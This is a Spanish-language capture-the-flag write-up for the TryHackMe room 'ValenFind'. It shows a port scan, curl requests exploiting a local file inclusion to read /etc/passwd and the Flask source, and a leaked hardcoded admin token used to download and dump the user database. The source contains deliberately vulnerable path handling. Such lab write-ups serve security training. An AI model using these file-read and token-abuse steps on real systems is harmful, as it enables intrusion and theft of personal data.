---
tags:
title: ValenFind - Medium (THM)
permalink: /ValenFind-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.67.182.119
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 17:57 -0400
Initiating Ping Scan at 17:57
Scanning 10.67.182.119 [4 ports]
Completed Ping Scan at 17:57, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:57
Completed Parallel DNS resolution of 1 host. at 17:57, 0.50s elapsed
Initiating SYN Stealth Scan at 17:57
Scanning 10.67.182.119 [65535 ports]
Discovered open port 22/tcp on 10.67.182.119
Discovered open port 5000/tcp on 10.67.182.119
Completed SYN Stealth Scan at 17:57, 7.62s elapsed (65535 total ports)
Nmap scan report for 10.67.182.119
Host is up, received echo-reply ttl 62 (0.18s latency).
Scanned at 2026-03-25 17:57:46 EDT for 7s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
5000/tcp open  upnp    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds
           Raw packets sent: 71430 (3.143MB) | Rcvd: 71377 (2.855MB)
-e [*] IP: 10.67.182.119
[*] Puertos abiertos: 22,5000
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,5000 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 17:57 -0400
Nmap scan report for 10.67.182.119
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 17:46:f2:65:81:f5:57:b9:b1:26:31:7c:b1:72:6b:2f (ECDSA)
|_  256 50:10:aa:62:70:d2:ca:32:0c:93:5f:c7:2f:80:7c:93 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: ValenFind - Secure Dating
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
```
## Website

En la pagina se hostea un servicio de citas.

![[Pasted image 20260325185711.png]]

Me registre con un usuario nuevo.

![[Pasted image 20260325190311.png]]
### LFI

Clickeando en cualquiera de los perfiles, veo como en mi consola se carga con `fetch_layout?=layout` y perfil determinado.

![[Pasted image 20260325192738.png]]

Probando dicho endpoint con `curl` veo que puedo leer archivos.

```bash
zs1n@ptw ~> curl -s -X GET 'http://10.67.182.119:5000/api/fetch_layout?layout=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
```
### CMDLINE

Viendo el contenido del `cmdline`, vi en donde corre la web.

![[Pasted image 20260325193708.png]]
### Source

Viendo que en el codigo de la misma el valor de la `api` junto con la cabecera con la que tengo que enviarla, lo que me permite extraer el archivo de base de datos en `/api/admin/export_db`.

```bash
zs1n@ptw ~> curl -s -X GET 'http://10.67.182.119:5000/api/fetch_layout?layout=/opt/Valenfind/app.py'
import os
import sqlite3
import hashlib
from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)

ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    if not os.path.exists(DATABASE):
        with app.app_context():
            db = get_db()
            cursor = db.cursor()

            cursor.execute('''
                CREATE TABLE users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    real_name TEXT,
                    email TEXT,
                    phone_number TEXT,
                    address TEXT,
                    bio TEXT,
                    likes INTEGER DEFAULT 0,
                    avatar_image TEXT
                )
            ''')

            cursor.executemany('INSERT INTO users (username, password, real_name, email, phone_number, address, bio, likes, avatar_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', INITIAL_USERS)
            db.commit()
            print("Database initialized successfully.")

@app.template_filter('avatar_color')
def avatar_color(username):
    hash_object = hashlib.md5(username.encode())
    return '#' + hash_object.hexdigest()[:6]

# --- ROUTES ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        try:
            cursor = db.cursor()
            cursor.execute('INSERT INTO users (username, password, bio, real_name, email, avatar_image) VALUES (?, ?, ?, ?, ?, ?)',
                       (username, password, "New to ValenFind!", "", "", "default.jpg"))
            db.commit()

            user_id = cursor.lastrowid
            session['user_id'] = user_id
            session['username'] = username
            session['liked'] = []

            flash("Account created! Please complete your profile.")
            return redirect(url_for('complete_profile'))

        except sqlite3.IntegrityError:
            return render_template('register.html', error="Username already taken.")
    return render_template('register.html')

@app.route('/complete_profile', methods=['GET', 'POST'])
def complete_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']

        db = get_db()
        db.execute('''
            UPDATE users
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()

        flash("Profile setup complete! Time to find your match.")
        return redirect(url_for('dashboard'))

    return render_template('complete_profile.html')

@app.route('/my_profile', methods=['GET', 'POST'])
def my_profile():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    db = get_db()

    if request.method == 'POST':
        real_name = request.form['real_name']
        email = request.form['email']
        phone = request.form['phone']
        address = request.form['address']
        bio = request.form['bio']

        db.execute('''
            UPDATE users
            SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ?
            WHERE id = ?
        ''', (real_name, email, phone, address, bio, session['user_id']))
        db.commit()
        flash("Profile updated successfully! ✅")
        return redirect(url_for('my_profile'))

    user = db.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone()
    return render_template('edit_profile.html', user=user)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()

        if user and user['password'] == password:
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['liked'] = []
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials.")
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    db = get_db()
    profiles = db.execute('SELECT id, username, likes, bio, avatar_image FROM users WHERE id != ?', (session['user_id'],)).fetchall()
    return render_template('dashboard.html', profiles=profiles, user=session['username'])

@app.route('/profile/<username>')
def profile(username):
    if 'user_id' not in session:
        return redirect(url_for('login'))

    db = get_db()
    profile_user = db.execute('SELECT id, username, bio, likes, avatar_image FROM users WHERE username = ?', (username,)).fetchone()

    if not profile_user:
        return "User not found", 404

    return render_template('profile.html', profile=profile_user)

@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')

    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
        return "Security Alert: Database file access is strictly prohibited."
    if 'seeder.py' in layout_file:
        return "Security Alert: Configuration file access is strictly prohibited."

    try:
        base_dir = os.path.join(os.getcwd(), 'templates', 'components')
        file_path = os.path.join(base_dir, layout_file)

        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        return f"Error loading theme layout: {str(e)}"

@app.route('/like/<int:user_id>', methods=['POST'])
def like_user(user_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))

    if 'liked' not in session:
        session['liked'] = []

    if user_id in session['liked']:
        flash("You already liked this person! Don't be desperate. 😉")
        return redirect(request.referrer)

    db = get_db()
    db.execute('UPDATE users SET likes = likes + 1 WHERE id = ?', (user_id,))
    db.commit()

    session['liked'].append(user_id)
    session.modified = True

    flash("You sent a like! ❤️")
    return redirect(request.referrer)

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('liked', None)
    return redirect(url_for('index'))

@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')

    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403
..snip..
```
### Extract db

Para hacerlo use `curl` nuevamente.

```bash
zs1n@ptw ~> curl -s -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" http://10.67.182.119:5000/api/admin/export_db --output valenfind_leak.db

..snip..

zs1n@ptw ~> file valenfind_leak.db
valenfind_leak.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 26, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 26
```

Como es `sqlite3` use la misma herramienta para dumpear los datos de la tablas `users`, viendo así la flag.

```bash
zs1n@ptw ~> sqlite3 valenfind_leak.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|romeo_montague|juliet123|Romeo Montague|romeo@verona.cupid|555-0100-ROMEO|123 Balcony Way, Verona, VR 99999|Looking for my Juliet. Where art thou?|14|romeo.jpg
2|casanova_official|secret123|Giacomo Casanova|loverboy@venice.kiss|555-0155-LOVE|101 Grand Canal St, Venice, Italy|Just here for the free chocolate.|5|casanova.jpg
3|cleopatra_queen|caesar_salad|Cleopatra VII Philopator|queen@nile.river|555-0001-NILE|Royal Palace, Alexandria, Egypt|I rule an empire, but I can't rule my heart. 🐍|88|cleo.jpg
4|sherlock_h|watson_is_cool|Sherlock Holmes|detective@baker.street|555-221B-KEYS|221B Baker Street, London, UK|Observant, logical, and looking for a mystery to solve (or a date).|21|sherlock.jpg
5|gatsby_great|green_light|Jay Gatsby|jay@westegg.party|555-1922-RICH|Gatsby Mansion, West Egg, NY, USA|Throwing parties every weekend hoping you'll walk through the door.|105|gatsby.jpg
6|jane_eyre|rochester_blind|Jane Eyre|jane@thornfield.book|555-1847-READ|Thornfield Hall, Yorkshire, UK|Quiet, independent, and looking for a connection of the soul.|34|jane.jpg
7|count_dracula|sunlight_sucks|Vlad Dracula|vlad@night.walker|555-0666-BITE|Bran Castle, Transylvania, Romania|I love long walks at night and biting... necks? No, biting into life!|666|dracula.jpg
8|cupid|admin_root_x99|System Administrator|cupid@internal.cupid|555-0000-ROOT|FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}|I keep the database secure. No peeking.|999|cupid.jpg
..snip..
```

`~Happy Hacking.`